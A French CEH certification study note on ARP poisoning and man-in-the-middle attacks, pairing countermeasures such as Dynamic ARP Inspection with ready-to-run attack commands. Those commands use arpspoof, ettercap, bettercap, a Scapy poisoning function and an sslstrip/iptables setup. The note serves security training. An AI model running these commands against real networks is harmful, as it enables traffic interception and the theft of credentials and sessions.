# ☠️ 04 — ARP Poisoning & Man-in-the-Middle

> **CEH v13 | Module 08 : Sniffing**  
> 📌 Section 4/8 — ARP Spoofing, MITM, outils offensifs

---

## 🔑 Rappel — Le protocole ARP

> **ARP** (Address Resolution Protocol) permet de trouver l'**adresse MAC** correspondant à une **adresse IP** sur un réseau local (couche 2/3).

### Fonctionnement normal

```
PC-Alice (192.168.1.10) veut parler à Routeur (192.168.1.1)
mais ne connaît pas sa MAC address

[1] ARP Request (broadcast)
    "Qui a l'IP 192.168.1.1 ? Dites-le à 192.168.1.10"
    src: MAC-Alice | dst: FF:FF:FF:FF:FF:FF

[2] ARP Reply (unicast)
    "C'est moi ! Ma MAC est AA:BB:CC:DD:EE:GG"
    src: MAC-Routeur | dst: MAC-Alice

[3] Alice met en cache :
    192.168.1.1 → AA:BB:CC:DD:EE:GG
```

**Cache ARP (Windows/Linux) :**
```bash
# Afficher le cache ARP
arp -a                    # Windows & Linux

# Linux uniquement
ip neigh show
```

> ⚠️ **Problème fondamental d'ARP :** Le protocole est **stateless et sans authentification**. N'importe qui peut envoyer une réponse ARP, même sans avoir reçu de requête !

---

## 💀 ARP Spoofing / ARP Poisoning

### Principe

> L'attaquant envoie de **fausses réponses ARP** aux victimes pour les convaincre que son **adresse MAC** correspond à l'**adresse IP** de la passerelle (ou d'une autre cible). Résultat : tout le trafic des victimes passe par l'attaquant → **Man-in-the-Middle (MITM)**.

### Schéma de l'attaque

```
AVANT ARP POISONING
─────────────────────────────────────────────────
Alice (192.168.1.10)    Cache ARP Alice :
Bob   (192.168.1.20)    192.168.1.1 → MAC-Routeur ✅
Routeur (192.168.1.1)   MAC-Routeur = CC:DD:EE:FF:00:11

PENDANT ARP POISONING (attaquant = Mallory 192.168.1.99)
─────────────────────────────────────────────────
Mallory → Alice  : "192.168.1.1 a la MAC-Mallory"
Mallory → Routeur: "192.168.1.10 a la MAC-Mallory"

Cache ARP Alice après poison :
192.168.1.1 → MAC-Mallory  ❌ (devrait être MAC-Routeur)

Cache ARP Routeur après poison :
192.168.1.10 → MAC-Mallory ❌ (devrait être MAC-Alice)

RÉSULTAT : MITM
─────────────────────────────────────────────────
Alice ──→ Mallory ──→ Routeur (Internet)
          (intercept)

Alice ←── Mallory ←── Routeur
          (intercept)
```

### Activation du forwarding IP (attaquant)

```bash
# IMPORTANT : activer le forwarding pour ne pas bloquer le trafic
# (pour que la victime ne perde pas la connectivité)
echo 1 > /proc/sys/net/ipv4/ip_forward
# ou
sysctl -w net.ipv4.ip_forward=1
```

---

## 🛠️ Outils d'ARP Spoofing

### arpspoof (dsniff)

```bash
# Terminal 1 : Dire à la victime que la gateway c'est nous
arpspoof -i eth0 -t 192.168.1.10 192.168.1.1

# Terminal 2 : Dire à la gateway que la victime c'est nous
arpspoof -i eth0 -t 192.168.1.1 192.168.1.10

# Activer IP forwarding pour être transparent
echo 1 > /proc/sys/net/ipv4/ip_forward
```

---

### Ettercap (mode texte)

```bash
# MITM ARP sur tout le réseau
ettercap -T -q -M arp:remote /192.168.1.0\/// 

# MITM ARP ciblé (victime ↔ gateway)
ettercap -T -q -M arp:remote /192.168.1.10/ /192.168.1.1/

# Options importantes :
# -T  : mode texte
# -q  : mode silencieux
# -M arp:remote : Man-in-the-Middle via ARP
```

---

### Bettercap (moderne)

```bash
# Lancer bettercap
bettercap -iface eth0

# Dans la console bettercap :
net.probe on          # Découvrir les hôtes
net.show              # Afficher les hôtes
arp.spoof.targets 192.168.1.10   # Cibler une IP
arp.spoof on          # Lancer l'ARP spoofing
net.sniff on          # Activer le sniffing
```

---

### Scapy (manuel)

```python
from scapy.all import *

# Empoisonner le cache ARP de la victime
def poison(victim_ip, victim_mac, gateway_ip):
    packet = ARP(
        op=2,              # ARP Reply
        pdst=victim_ip,    # Destination IP (victime)
        hwdst=victim_mac,  # Destination MAC (victime)
        psrc=gateway_ip    # IP source (on se fait passer pour la gateway)
    )
    send(packet, verbose=False)
```

---

## 📊 Ce qu'on peut faire après un MITM ARP

```
MITM ÉTABLI → Possibilités d'attaque
├── 🔍 Sniffing passif     → capturer credentials cleartext (HTTP, FTP, Telnet)
├── 🔐 SSL Stripping       → downgrader HTTPS → HTTP (sslstrip)
├── 🎭 DNS Spoofing        → rediriger vers faux sites
├── 💉 Injection de contenu→ insérer du code dans pages HTTP
├── 📸 Screenshot/capture  → enregistrer écrans partagés
├── 🍪 Cookie stealing     → vol de sessions web
└── 🔑 Credential harvesting → capturer tous les logins
```

### SSL Stripping

```bash
# Activer IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Rediriger port 80 pour sslstrip
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

# Lancer sslstrip
sslstrip -l 8080

# Lancer arpspoof en parallèle
arpspoof -i eth0 -t 192.168.1.10 192.168.1.1
```

> **Contre-mesure SSL Stripping :** HSTS (HTTP Strict Transport Security) + HSTS Preload

---

## 🛡️ Contre-mesures ARP

### Dynamic ARP Inspection (DAI)

> Le DAI utilise la **DHCP Snooping Binding Table** pour valider chaque paquet ARP. Si l'IP/MAC ne correspond pas à l'entrée de la table, le paquet est **rejeté**.

```
Paquet ARP reçu sur port untrusted
         │
         ▼
  DAI vérifie la DHCP Snooping Binding Table
         │
   ┌─────┴────────┐
   │              │
Entrée trouvée   Pas d'entrée
& correspond     ou ne correspond pas
   │              │
   ▼              ▼
Paquet accepté   Paquet rejeté + log
```

```cisco
! Activer DAI sur les VLANs
Switch(config)# ip arp inspection vlan 1,10

! Définir ports trusted (ex: uplink vers routeur)
Switch(config-if)# ip arp inspection trust

! Vérification
Switch# show ip arp inspection
Switch# show ip arp inspection statistics
```

---

### Autres contre-mesures ARP

| Contre-mesure | Description |
|--------------|-------------|
| **Entrées ARP statiques** | Configurer manuellement les entrées ARP critiques (gateway) |
| **ARP Watch** | Outil Linux qui surveille les changements ARP suspects |
| **XArp** | Détection d'ARP poisoning en temps réel |
| **VPN** | Chiffrement de bout en bout → interception inutile |
| **802.1X** | Authentification avant accès au réseau |

```bash
# Entrée ARP statique (Linux) - Contre MAC spoofing
arp -s 192.168.1.1 CC:DD:EE:FF:00:11

# Vérifier le cache ARP
arp -a
```

---

## 📌 Points clés examen

> ⚠️ **Questions fréquentes :**

- **ARP** est **sans authentification** → exploitable par n'importe qui sur le LAN
- **ARP Spoofing** = envoyer de fausses réponses ARP → cache ARP empoisonné
- **MITM** = Man-in-the-Middle → attaquant relaie le trafic entre deux parties
- Outils : **arpspoof**, **Ettercap**, **Bettercap**, **Cain & Abel**
- **IP forwarding** doit être activé pour que la victime garde sa connectivité
- **DAI** (Dynamic ARP Inspection) = contre-mesure principale niveau switch
- **DAI** fonctionne avec la **DHCP Snooping Binding Table**
- **SSL Stripping** = downgrade HTTPS→HTTP lors d'un MITM

---

## 🔗 Navigation

| ← Précédent | Suivant → |
|-------------|-----------|
| [03 — DHCP Attacks](./03_DHCP_Attacks.md) | [05 — DNS & Autres Spoofing](./05_DNS_et_Autres_Spoofing.md) |
